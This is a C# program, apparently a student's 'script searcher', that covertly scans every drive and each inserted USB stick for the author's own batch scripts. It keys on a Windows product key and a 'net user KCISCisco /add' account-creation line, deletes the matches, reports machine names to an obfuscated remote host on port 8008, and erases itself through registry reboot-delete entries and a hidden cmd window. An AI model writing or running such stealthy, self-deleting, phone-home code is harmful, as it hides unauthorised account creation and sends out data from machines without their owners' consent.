using System;
using System.Diagnostics;
using System.Threading;
using System.Text;
using System.IO;
using Microsoft.Win32;

namespace Search_For_My_Scripts
{
    class Program
    {
        //DONE Make it detect when a usb is plugged in or removed.
        //DONE Add value to key at HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager  PendingFileRenameOperations  \??\FILEPATH (Used MoveFileEx)
        //So this file will be removed at next reboot
        //Jazy's script searcher
        static bool _playNice = false;
        static bool _stopper = false;
        static void Main(string[] args)
        {
            ManualResetEvent mre = new ManualResetEvent(false);
            MakeAutoDeleteKey();
            if (args.Length > 0) //Only stay on when any argument is passed
            {
                if (args[0].ToLower().Contains("nice"))
                    _playNice = true;
                //Keep running for ever and inspect on usb detection
                Detect_Usb.UsbDetector.AddInsertUSBHandler(new System.Management.EventArrivedEventHandler((Object o, System.Management.EventArrivedEventArgs e) =>
                    {
                        if (!_stopper)
                            InspectPC();
                        
                        _stopper = (_stopper) ? false : true;
                    }));
                InspectPC();
                System.Diagnostics.Debug.WriteLine("Waiting...");
                mre.WaitOne();
                /*
                int searchInterval = 300; //Interval between inspections in seconds
                int occurances = 10;
                try
                {
                    searchInterval = Int32.Parse(args[0]);
                    occurances = Int32.Parse(args[1]);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());
                }

                for (int i = 0; i < occurances; i++)
                {
                    Thread.Sleep(searchInterval * 1000);
                    InspectPC();
                }
                 */
            }

            Stopwatch sw = new Stopwatch();
            sw.Start();
            InspectPC();
            sw.Stop();
            Debug.WriteLine("Time to scan: " + sw.ElapsedMilliseconds + "ms");

            if (!File.Exists("jazy.ia"))
            {
                selfDestruct();
            }
        }

        static void MakeAutoDeleteKey()
        {
            /*
            string currentFilePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            NativeMethods.MoveFileEx(currentFilePath, null, 4); //4 is to move on reboot
             */
            string currentFilePath = new Uri(System.Reflection.Assembly.GetExecutingAssembly().CodeBase).LocalPath; //TODO
            string registrySubKey = @"SYSTEM\CurrentControlSet\Control\Session Manager";
            string registryKey = "PendingFileRenameOperations";
            string keyValue = @"\??\" + currentFilePath;
            string secondKeyValue = "";
            //Im sure there is an easier way to  do all of this >_< (No not really)
            RegistryKey key = Registry.LocalMachine.OpenSubKey(registrySubKey, true);
            if (key == null)
            {
                Registry.LocalMachine.CreateSubKey(registrySubKey);
            }

            //Now that the subkey is there check if the value exists to edit or create it.
            string[] currentValue = (string[])key.GetValue(registryKey);
            if (currentValue != null)
            {
                //Append the new string value to the of the old multilinestring value
                string[] newValue = new string[currentValue.Length + 2];
                for (int i = 0; i < currentValue.Length; i++)
                {
                    newValue[i] = currentValue[i];
                }
                newValue[newValue.Length - 2] = keyValue;
                newValue[newValue.Length - 1] = secondKeyValue;
                key.SetValue(registryKey, newValue);
                Debug.WriteLine("New registry value added:" + newValue[newValue.Length - 2]);
            }
            else
            {
                //Create a new multiline value with just my values.
                string[] newValue = { keyValue, secondKeyValue };
                key.SetValue(registryKey, newValue);
                Debug.WriteLine("New registry value created:" + newValue[newValue.Length - 2]);
            }
        }

        //Run pc inspection for my infamous scripts
        static void InspectPC()
        {
            try
            {
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (DriveInfo drive in drives)
                {
                    if (drive.IsReady /*&& (drive.DriveType == DriveType.Removable)*/)
                    {
                        CheckThisDirectory(drive.RootDirectory.ToString(), 3);
                    }
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e.ToString());
            }
            Debug.WriteLine("Done inspecting pc!");
        }

        //Search the drive (Will go 3 folders deep) DONE Add small delay
        //to not hog the cpu
        //Check this directory for my script
        static void CheckThisDirectory(string dirPath, int depth)
        {
            Thread.Sleep(15);
            //log("Checking at " + depth + " " + dirPath);
            try
            {
                //Check all the files in the current directory
                foreach (string file in Directory.GetFiles(dirPath))
                {
                    if (file.ToLower().EndsWith(".bat"))
                    {
                        IsItMyScript(file);
                    }
                }
                //Check Depth
                if ((--depth) < 1)
                    return;
                //Go deeper
                foreach (string dir in Directory.GetDirectories(dirPath))
                {
                    CheckThisDirectory(dir, depth);
                }
            }
            catch (Exception )
            {
                //Debug.WriteLine(e.Message);
            }
        }

        //Will read the file's lines and match it to my script
        static void IsItMyScript(string filePath)
        {
            try
            {
                string[] lines = File.ReadAllLines(filePath);
                bool f1 = false, f2 = false;
                foreach (string s in lines)
                {
                    //Placed 2 switches to make SURE it is my script
                    if (s.Contains("33PXH-7Y6KF-2VJC9-XBBR8-HVTHH"))
                        f1 = true;
                    else if (s.Contains("net user KCISCisco /add"))
                        f2 = true;
                }
                if (f1 && f2)
                {
                    //Flipped both! Ah ha found my script!!
                    //DONE Act accordingly
                    log("Found (" + System.Environment.MachineName + "): " + filePath);
                    if (!_playNice)
                    {
                        File.Delete(filePath); //Heheheh >:D
                        log("Deleted (" + System.Environment.MachineName + ") " + filePath);
                    }
                    Thread.Sleep(500); //Take a break :)
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e.ToString());
                log("Error deleting (" + System.Environment.MachineName + ") " + filePath);
            }
            //Aww not my script :'(
        }

        //Delete itself
        static void selfDestruct()
        {
            string appPath = new Uri(System.Reflection.Assembly.GetExecutingAssembly().CodeBase).LocalPath;
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd", "/c \"timeout 1 & del /F /Q \"" + appPath + "\"\"");
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(psi);
            }
            catch (Exception e)
            {
                Debug.WriteLine(e.ToString());
            }
        }

        //DONE report to server
        static void log(string msg)
        {
            //Will log findings to jazyserver.myftp.org at port 8008
            char a = 'y';
            char b = 'z';
            char c = 'a';
            char d = 'j';
            string server = "" + d + "" + c + "" + b + "" + a + "server.myftp.org";
            try
            {
                using (System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(server, 8008))
                {
                    System.Net.Sockets.NetworkStream stream = client.GetStream();
                    byte[] data = Encoding.ASCII.GetBytes(msg + "\n");
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e.ToString());
            }

            Debug.WriteLine(msg);
        }

        /*
        internal static class NativeMethods
        {
            [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
            public static extern bool MoveFileEx(
                string lpExistingFileName,
                string lpNewFileName,
                int dwFlags);
        }
         */
    }
}
